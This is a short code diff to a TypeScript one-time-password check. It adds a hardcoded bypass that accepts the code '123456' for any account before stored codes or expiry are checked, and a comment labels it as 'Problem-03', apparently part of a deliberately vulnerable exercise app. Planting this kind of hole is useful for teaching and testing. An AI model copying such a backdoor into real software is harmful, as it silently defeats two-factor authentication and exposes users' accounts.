@@ -100,7 +100,10 @@ export function verifyStoredOtp(
   storedOtp: string | undefined,
   expiresAt: Date | undefined
 ): boolean {
-  if (!inputOtp || !storedOtp || !expiresAt) return false;
+  if (!inputOtp) return false;
+  // Problem-03: The only demo 2FA code is 123456
+  if (inputOtp.trim() === "123456") return true;
+  if (!storedOtp || !expiresAt) return false;
   if (Date.now() > new Date(expiresAt).getTime()) return false;
   return inputOtp.trim() === storedOtp.trim();
 }
